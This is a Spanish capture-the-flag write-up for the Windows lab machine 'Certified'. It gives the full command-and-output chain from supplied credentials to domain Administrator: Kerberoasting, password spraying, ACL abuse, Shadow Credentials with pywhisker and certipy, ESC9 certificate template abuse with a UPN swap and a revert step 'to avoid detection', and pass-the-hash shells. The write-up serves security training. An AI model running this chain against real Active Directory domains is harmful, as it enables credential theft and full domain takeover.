# Certified

![](../../../../~gitbook/image.md)Publicado: 02 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Medium
OS: Windows
###📝 Descripción
Certified es una máquina Windows de dificultad media que simula un entorno de Active Directory con servicios de certificados (ADCS) implementados. La máquina requiere explotar vulnerabilidades en la configuración de certificados digitales y abusar de permisos de Active Directory para lograr la escalada de privilegios.El proceso de explotación involucra el uso de credenciales iniciales proporcionadas, enumeración exhaustiva de usuarios y servicios, abuso de permisos `WriteOwner` y `GenericWrite` en Active Directory, implementación de ataques Shadow Credentials mediante `pywhisker`, y finalmente explotación de la vulnerabilidad ESC9 en plantillas de certificados ADCS para obtener acceso administrativo.Esta máquina es especialmente valiosa para practicar técnicas de post-explotación en entornos empresariales reales, donde los servicios de certificados son comunes y las misconfigurations pueden llevar a compromisos completos del dominio.
###🎯 Puntos Clave
- Enumeración de Active Directory: Uso de herramientas como `netexec`, `impacket` y `bloodhound` para mapear el dominio
- Abuso de Permisos ACL: Explotación de `WriteOwner` y `GenericWrite` para modificar membresías de grupos
- Shadow Credentials Attack: Implementación de credenciales sombra usando `pywhisker` para obtener hashes NTLM
- ADCS Exploitation: Identificación y explotación de la vulnerabilidad ESC9 en plantillas de certificados
- Certificate Template Abuse: Manipulación de UPN (User Principal Name) para suplantar identidades
- Pass-the-Hash: Uso de hashes NTLM para autenticación sin conocer contraseñas en texto plano

###🔍 Información de la Máquina
AtributoValorIP10.10.11.41Dominiocertified.htbControlador de DominioDC01.certified.htbServicios ClaveADCS, LDAP, SMB, WinRM, KerberosVulnerabilidadesESC9, Shadow Credentials, ACL Abuse
###🔭 Reconocimiento

####🏓 Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
####🚀 Escaneo de puertos

####🔍 Enumeración de servicios
⚠️ Añadimos el siguiente vhost a nuestro fichero /etc/hosts:
####📋 Análisis de Servicios Detectados
Los puertos abiertos revelan un controlador de dominio Windows con los siguientes servicios clave:- Puerto 53 (DNS): Servicio de resolución de nombres del dominio
- Puerto 88 (Kerberos): Autenticación del dominio
- Puerto 389/636 (LDAP/LDAPS): Directorio activo para consultas
- Puerto 445 (SMB): Compartición de archivos y administración remota
- Puerto 5985 (WinRM): Administración remota de Windows
- Puerto 9389 (.NET Message Framing): Posible servicio ADCS

####🔑 Credenciales Iniciales
Como es común en las pruebas de penetración de Windows de la vida real, iniciará el cuadro de Administrador con las credenciales de la siguiente cuenta:- Nombre de usuario: judith.mader
- Contraseña: judith09

###🌐 Enumeración de Servicios

####🗂️ 445 SMB - Enumeración Inicial
Ya que disponemos de credenciales, comenzamos tratando de enumerar recursos compartidos, usuarios etc:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)
####👥 Enumeración de Usuarios del Dominio
Creamos una lista con los usuarios obtenidos:![](../../../../~gitbook/image.md)
####🎫 Verificación AS-Rep Roast
Verificamos si de los usuarios obtenidos hay alguno que tenga la pre-autenticación de kerberos deshabilitada y podamos obtener un ticket:❌ Resultado: Ningún usuario vulnerable a AS-Rep Roast
####🎯 Verificación Kerberoasting
Con la credencial de la que disponemos verificamos si hay alguna cuenta sobre la que podamos realizar un ataque de kerberoasting:Obtenemos un resultado para la cuenta management_svc, no obstante, intentamos crackearlo offline usando hashcat y el diccionario rockyou.txt sin éxito:![](../../../../~gitbook/image.md)
####💧 Password Spraying
Verificamos si la contraseña de Judith está siendo reutilizada por algún otro usuario del dominio:bashResultado: Solo Judith usa esta contraseña
###🩸 Análisis con BloodHound
Utilizamos bloodhound-python como collector con las credenciales de judith para poder obtener el modelo del dominio y cargar en bloodhound con el fin de analizar posibles vías potenciales para ganar acceso.
####🎯 Hallazgos Clave en BloodHound
Vemos que Judith tiene permisos "WriteOwner" sobre el grupo Management:![](../../../../~gitbook/image.md)Además, vemos que cualquiera que pertenezca al grupo Management tiene permisos GenericWrite sobre la cuenta del usuario management_svc por lo que ya tenemos aquí una vía potencial de acceso:![](../../../../~gitbook/image.md)
####📈 Cadena de Ataque Identificada
- judith.mader → WriteOwner → Management Group
- Management Group → GenericWrite → management_svc
- management_svc → Certificate Service DCOM Access → ADCS Exploitation

###🚀 Explotación - Acceso Inicial

####👑 Abusando de WriteOwner
Primero necesitamos hacer que judith pertenezca al grupo Management:![](../../../../~gitbook/image.md)Ahora, usaré RPC para agregar a Judith al grupo de management:
####🔐 Implementando Shadow Credentials
Aquí podríamos usar targetedKerberoast para tratar de realizar un ataque de kerberoasting sobre la cuenta management_svc y tratar de crackear la contraseña, pero esto ya lo hicimos con otro método anteriormente y vimos que la contraseña no estaba en rockyou.txt![](../../../../~gitbook/image.md)Podemos abusar de las credenciales shadow y obtener un hash de NT usando pywhisker, suponiendo que tengamos el ticket Kerberos (lo cual sí tenemos).Primero, usaré pywhisker para comprobar si management_svc tiene credenciales shadow:Nos da un error de permisosPara solucionarlo usamos `--action add` para agregar un atributo de clave pública (`msDS-KeyCredentialLink`) al usuario objetivo.
####🎫 Obteniendo TGT con PKINITtools
Haré exactamente los pasos que nos ha indicado el comando del paso anterior y usaré PKINITtools para obtener el TGT:Actualizamos el reloj del sistema con el DC:Ahora ejecutaré el comando proporcionando la información del comando anterior:
####🔓 Extrayendo Hash NTLM
Exportamos la variable KRB5CCNAME con el ticket, actualizamos de nuevo la hora y usamos la herramienta getnthash.py para obtener el hash NTLM con el que podremos realizar pass the hash:
####🎊 Primer Acceso - User Flag
Una vez obtenido el hash realizamos pass the hash usando evil-winrm y ganamos acceso como management_svc y ya podemos obtener la primera flag:
####🔐 Escalada de Privilegios - ADCS Certificate Attack (ESC9)
📋 Información InicialDurante la enumeración del usuario actual, se descubrió que pertenece al grupo Certificate Service DCOM Access, lo cual es clave para esta escalada de privilegios.![](../../../../~gitbook/image.md)
###🎯 Objetivo
Necesitamos escalar privilegios desde `management_svc` hasta `ca_operator` y finalmente obtener acceso como Administrator aprovechando vulnerabilidades en ADCS (Active Directory Certificate Services).![](../../../../~gitbook/image.md)
####🔍 Fase 1: Shadow Credentials Attack

####Contexto
- Usuario actual: `management_svc`
- Objetivo: `ca_operator`
- Privilegio: GenericAll sobre ca_operator
- Técnica: Certipy shadow credentials

####Comando Ejecutado

####Resultado Obtenido
✅ Éxito: Obtenido el hash NTLM de `ca_operator`
####🔍 Fase 2: Enumeración de Plantillas Vulnerables

####Búsqueda de Vulnerabilidades ADCS
![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Hallazgo Crítico🚨 Plantilla Vulnerable Encontrada: `Certified Authentication`- Vulnerabilidad: ESC9
- Impacto: Permite escalada de privilegios a Administrator

####⚡ Fase 3: Explotación ESC9
Paso 1: Modificación del UPNCambiar el UPN de `ca_operator` a `Administrator`:![](../../../../~gitbook/image.md)Paso 2: Solicitud de CertificadoSolicitar la plantilla vulnerable como `ca_operator`:![](../../../../~gitbook/image.md)Paso 3: Restauración del UPNRevertir el UPN para evitar detección:![](../../../../~gitbook/image.md)Paso 4: Autenticación con CertificadoObtener hash NTLM del Administrator:Resultado Final
####🏆 Fase 4: Acceso Final como Administrator

####Pass-the-Hash Attack

####Verificación de Acceso
Last updated 9 months ago- [📝 Descripción](#descripcion)
- [🎯 Puntos Clave](#puntos-clave)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración de Servicios](#enumeracion-de-servicios-1)
- [🩸 Análisis con BloodHound](#analisis-con-bloodhound)
- [🚀 Explotación - Acceso Inicial](#explotacion-acceso-inicial)
- [🎯 Objetivo](#objetivo)

```
❯ ping -c2 10.10.11.41
PING 10.10.11.41 (10.10.11.41) 56(84) bytes of data.
64 bytes from 10.10.11.41: icmp_seq=1 ttl=127 time=47.6 ms
64 bytes from 10.10.11.41: icmp_seq=2 ttl=127 time=48.0 ms

--- 10.10.11.41 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1005ms
rtt min/avg/max/mdev = 47.580/47.804/48.029/0.224 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.41 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49689,49690,49693,49720,49741
```

```
nmap -sC -sV -p$ports 10.10.11.41 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-02 17:46 CEST
Nmap scan report for 10.10.11.41
Host is up (0.047s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-02 22:47:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-02T22:48:31+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:04:20
|_Not valid after:  2105-05-23T21:04:20
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-02T22:48:30+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:04:20
|_Not valid after:  2105-05-23T21:04:20
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:04:20
|_Not valid after:  2105-05-23T21:04:20
|_ssl-date: 2025-07-02T22:48:31+00:00; +7h00m01s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:04:20
|_Not valid after:  2105-05-23T21:04:20
|_ssl-date: 2025-07-02T22:48:30+00:00; +7h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49720/tcp open  msrpc         Microsoft Windows RPC
49741/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
| smb2-time:
|   date: 2025-07-02T22:47:52
|_  start_date: N/A
```

```
echo "10.10.11.41 certified.htb dc01.certified.htb" | sudo tee -a /etc/hosts
```

```
netexec smb 10.10.11.41 -u 'judith.mader' -p 'judith09' --shares
```

```
netexec smb 10.10.11.41 -u 'judith.mader' -p 'judith09' --users
```

```
netexec smb 10.10.11.41 -u 'judith.mader' -p 'judith09' --rid-brute 2>/dev/null | awk -F '\\' '{print $2}' | grep 'SidTypeUser' | sed 's/ (SidTypeUser)//' > Users.txt
```

```
impacket-GetNPUsers -dc-ip 10.10.11.41 certified.htb/ -usersfile Users.txt -format hashcat
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User judith.mader doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User management_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ca_operator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User alexander.huges doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User harry.wilson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User gregory.cameron doesn't have UF_DONT_REQUIRE_PREAUTH set
```

```
sudo ntpdate 10.10.11.41 &&  impacket-GetUserSPNs certified.htb/judith.mader:'judith09' -dc-ip certified.htb -request
[sudo] password for kpanic:
2025-07-03 01:01:56.392496 (+0200) +25200.079875 +/- 0.022912 10.10.11.41 s1 no-leap
CLOCK: time stepped by 25200.079875
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName               Name            MemberOf                                    PasswordLastSet             LastLogon  Delegation
---------------------------------  --------------  ------------------------------------------  --------------------------  ---------  ----------
certified.htb/management_svc.DC01  management_svc  CN=Management,CN=Users,DC=certified,DC=htb  2024-05-13 17:30:51.476756

[-] CCache file is not found. Skipping...
$krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$dcf6d378a72ac5b42a5834cf335d54f3$88802d10e967774cd2cd9ebe8150152aea70f36bd5a55920fe1aa3953a91b1490bd16b4b53cb1ae7f554de39ca4a2418bd191f161c368f0c6c3bd138a8bf0d016a664bc8f359386d21bb0d9eb10e007e2d4f0beb999583f270a3018973187f46b777f9486d5325e0d112a6b91b135a23fc8aff26ef156205397c808a918777a9cf13e3660c20eb35cf23d552138de57ba27965adffb4255363e3b7b5eec3acfe2093daa18c1759f4fd43ce1c8530e59761cefbf51e7a855e10c2d83cbb262224602a7a9590a7611bd59d6471b1a43dfc951b368b41c8e4cad2240770f67a2d721772472e1360dccc9e94839e0d7b16d67df30f029923b355b88ac38f8e369c9ba921512cba4718bef3da818398a99e2690f3267e35f76115a88c6baf036d2866c440ab7706ed87cc87e2778b7d38abe860db8dd33a309b742f095449dc653d4d8c771208b857689b84d7d6169072e9eceef459b1219d7cd6f359631746207dd36d936ef9ed87bc1141f29e3d0747ccaeddf4a8c0ea35d14bc7c6b7211ba1be7c962c1d8fa8640a2343ae0a158a3511c9f73c4f3a600e4bfbdb1235ffae8c069b7410e4323198567b5121830ca24439d963c6aed5380873ae1b6aaa7ce84098551684ef5f2bde05780721c707cbcb4a3b9541b1a5bf1bde013789b4365f7093f38367664d8de8107b943edf6c79500c046d050d6257da8f12879fa2cb530a7cb2efd50cf0904a7b27916344421edfb8c306076eef664e325bab6b3f21c2d1508a23b596a77a75606ad90d7536fe35802577a6b78894a4f3e077ea27dfb7d67549dab59c16395d2a902aa24385cfe26c042ebb7ddf7406bb793ba41db75e2e0af8389ef3a00a6a1f5ef9f289238b75ea6378bcf6e337311790d931fbf567a937a532447899bda317e3cc6f9c52428d84010862f40eccd67da7437512bb8a468209148553bccfb5512c46c721f2ad6e0e9c0386674946366c4066a953a7cff8f33bd0c6ed27b9e1c901be03b9dda3f46744c82e3c04b70694bb2d928fb458ae242de953663c090137e0f87aea9bf9ed0101dc69de306047294475e96284b1a4b97aa0fe86fd33eb4aaed521e86c479bf86f066561075a89cb81c652020efd816453d52f92108a7b0cedcde289fd17933a1829b86ecb0bed443f2d3460fcc1b71d96385bbf25c1603022e81191db1656a141e1bb25771e68e6e53bc9a99625fdd8d2cced5e87fade04c91b718a0f286e378bbecfaab6ea6e4b8c00416b5d95b0fcb838b1b8d518ff91cdb734732fdaca3a0eacacecd30251128591bc79df55cb16c19ccbda382410eff947270e2dd812365b0a78ff8b545b09d45bb88279297f854f62c373f3bba30f0e34968658406d2690a5371f7fb2f01378628fe5f156d0f1b55715e9bbd52572b30a1ba41d9a7418d3ecb57598666ff14a1823cf2c01a762765ccfdcc46fee25d9d9459dc29be456367750e9fe2ab82e81d5d57426dcb33864754ddf268dc7421e519d96ab3c6e5a9b06bf710e1f9283956c9474e6cef5405345d32c5eb9fe06621a0ea2d13b75241d53fa4a7886d7b2997c44
```

```
hashcat -m 13100  management_svc_hash /usr/share/wordlists/rockyou.txt
```

```
netexec smb 10.10.11.41 -u Users.txt -p 'judith09' --continue-on-success
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [-] certified.htb\Administrator:judith09 STATUS_LOGON_FAILURE
SMB         10.10.11.41     445    DC01             [-] certified.htb\Guest:judith09 STATUS_LOGON_FAILURE
SMB         10.10.11.41     445    DC01             [-] certified.htb\krbtgt:judith09 STATUS_LOGON_FAILURE
SMB         10.10.11.41     445    DC01             [-] certified.htb\DC01$:judith09 STATUS_LOGON_FAILURE
SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09
SMB         10.10.11.41     445    DC01             [-] certified.htb\management_svc:judith09 STATUS_LOGON_FAILURE
SMB         10.10.11.41     445    DC01             [-] certified.htb\ca_operator:judith09 STATUS_LOGON_FAILURE
SMB         10.10.11.41     445    DC01             [-] certified.htb\alexander.huges:judith09 STATUS_LOGON_FAILURE
SMB         10.10.11.41     445    DC01             [-] certified.htb\harry.wilson:judith09 STATUS_LOGON_FAILURE
SMB         10.10.11.41     445    DC01             [-] certified.htb\gregory.cameron:judith09 STATUS_LOGON_FAILURE
```

```
netexec winrm 10.10.11.41 -u Users.txt -p 'judith09' --continue-on-success
```

```
bloodhound-python -d certified.htb -u judith.mader -p judith09 -gc dc01.certified.htb -c all
```

```
impacket-owneredit -action write -new-owner 'judith.mader' -target 'management' 'certified.htb/judith.mader:judith09' -dc-ip 10.10.11.41
```

```
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'judith.mader' -target 'management' 'certified.htb/judith.mader:judith09' -dc-ip 10.10.11.41
```

```
net rpc group addmem "MANAGEMENT" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S 10.10.11.41
```

```
git clone https://github.com/ShutdownRepo/pywhisker.git
cd pywhisker
pip3 install -r requirements.txt
cd pywhisker
```

```
python3 pywhisker.py --action list -d certified.htb -u judith.mader -p judith09 --dc-ip 10.10.11.41 -t management_svc
```

```
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Attribute msDS-KeyCredentialLink is either empty or user does not have read permissions on that
attribute
```

```
python3 pywhisker.py --action add -d certified.htb -u judith.mader -p judith09 --dc-ip 10.10.11.41 -t management_svc
```

```
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 2f39823d-e599-fd63-171a-75c855aad034
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: 2KePHqK3.pfx
[+] PFX exportiert nach: 2KePHqK3.pfx
[i] Passwort für PFX: mYUC2jCqeyQ7HztBZMrT
[+] Saved PFX (#PKCS12) certificate & key at path: 2KePHqK3.pfx
[*] Must be used with password: mYUC2jCqeyQ7HztBZMrT
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

```
git clone https://github.com/dirkjanm/PKINITtools
cd PKINITtools
pip3 install -r requirements.txt
```

```
sudo ntpdate 10.10.11.41
```

```
gettgtpkinit -cert-pfx 2KePHqK3.pfx -pfx-pass mYUC2jCqeyQ7HztBZMrT certified.htb/management_svc management_svc.ccache -dc-ip 10.10.11.41

2025-07-03 01:56:58,558 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-07-03 01:56:58,583 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-07-02 18:57:00,750 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-07-02 18:57:00,751 minikerberos INFO     4c91abe834c1f30d18b1932c86cd870426fd064ab6d522b345d0b2841b7b5185
INFO:minikerberos:4c91abe834c1f30d18b1932c86cd870426fd064ab6d522b345d0b2841b7b5185
2025-07-02 18:57:00,759 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

```
export KRB5CCNAME=management_svc.ccache

sudo ntpdate 10.10.11.41
```

```
getnthash certified.htb/management_svc -key
4c91abe834c1f30d18b1932c86cd870426fd064ab6d522b345d0b2841b7b5185

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584
```

```
evil-winrm -i 10.10.11.41 -u management_svc -H "a091c1832bcdd4677c28b5a6a1295584"

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\management_svc\Documents> whoami
certified\management_svc

*Evil-WinRM* PS C:\Users\management_svc\Desktop> dir

Directory: C:\Users\management_svc\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         7/2/2025   3:44 PM             34 user.txt
```

```
sudo ntpdate 10.10.11.41 && certipy-ad shadow auto \
-username management_svc@certified.htb \
-hashes 'a091c1832bcdd4677c28b5a6a1295584' \
-account ca_operator
```

```
[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'b19de358-337d-adcb-39cc-fa1685adff16'
[*] Adding Key Credential with device ID 'b19de358-337d-adcb-39cc-fa1685adff16'
[*] Successfully added Key Credential for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Got TGT
[*] Saving credential cache to 'ca_operator.ccache'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
```

```
certipy-ad find -u ca_operator \
-hashes 'b4b86f45c6018f1b664f70805f45d8f2' \
-target certified.htb \
-text -stdout -vulnerable
```

```
certipy-ad account update \
-username management_svc@certified.htb \
-hashes 'a091c1832bcdd4677c28b5a6a1295584' \
-user ca_operator \
-upn Administrator
```

```
certipy-ad req \
-username ca_operator@certified.htb \
-hashes 'b4b86f45c6018f1b664f70805f45d8f2' \
-ca certified-DC01-CA \
-template CertifiedAuthentication
```

```
certipy-ad account update \
-username management_svc@certified.htb \
-hashes 'a091c1832bcdd4677c28b5a6a1295584' \
-user ca_operator \
-upn ca_operator@certify.htb
```

```
sudo ntpdate 10.10.11.41 && certipy-ad auth \
-pfx administrator.pfx \
-domain certified.htb \
-dc-ip 10.10.11.41
```

```
[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Using principal: 'administrator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:
```

```
evil-winrm -i 10.10.11.41 -u administrator -H ''
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
certified\administrator

*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         7/2/2025   3:44 PM             34 root.txt
```
